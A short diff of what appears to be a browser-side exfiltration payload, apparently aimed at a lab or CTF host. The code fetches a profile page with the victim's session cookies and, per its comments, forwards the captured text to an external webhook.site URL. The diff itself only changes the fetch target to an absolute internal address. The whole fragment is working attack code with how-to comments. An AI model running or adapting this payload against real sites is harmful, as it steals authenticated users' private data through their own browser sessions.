@@ -18,7 +18,7 @@ const WEBHOOK = "https://webhook.site/1f9b4f19-2450-4597-88a2-f1f2a4440af4";
 
     /* 2⃣  Pull something that is sure to be readable (HTML, JSON, whatever).
            `/profile` is just an example; pick a page that exists. */
-    const resp  = await fetch("/profile", { credentials: "include" });
+    const resp  = await fetch("http://seekdeep:3000/profile", { credentials: "include" });
     const page  = await resp.text();
 
     /* 3⃣  Forward the captured text to your webhook.
